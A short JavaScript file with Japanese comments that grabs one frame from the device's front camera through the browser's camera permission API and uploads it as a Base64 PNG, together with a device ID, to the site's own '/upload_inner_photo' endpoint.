function takePhoto(deviceId) {
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);

    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
        .then(function (stream) {
            video.srcObject = stream;
            video.setAttribute('playsinline', true);
            video.play();

            // 0.5秒後に撮影
            setTimeout(function () {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Base64形式で画像データを取得
                const imageData = canvas.toDataURL('image/png');

                // 画像データをサーバーに送信
                uploadInnerPhoto(deviceId, imageData);

                // ストリームを停止
                stream.getTracks().forEach(track => track.stop());
                video.remove();
                canvas.remove();
            }, 500);
        })
        .catch(function (error) {
            console.error('Error accessing inner camera:', error);
            alert('内カメラへのアクセスに失敗しました: ' + error);
            video.remove();
        });
}

function uploadInnerPhoto(deviceId, imageData) {
    fetch('/upload_inner_photo', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ id: deviceId, image: imageData })
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            console.log('Inner photo uploaded successfully:', data.path);
        } else {
            console.error('Failed to upload inner photo:', data.message);
        }
    })
    .catch(error => {
        console.error('Error uploading inner photo:', error);
    });
}
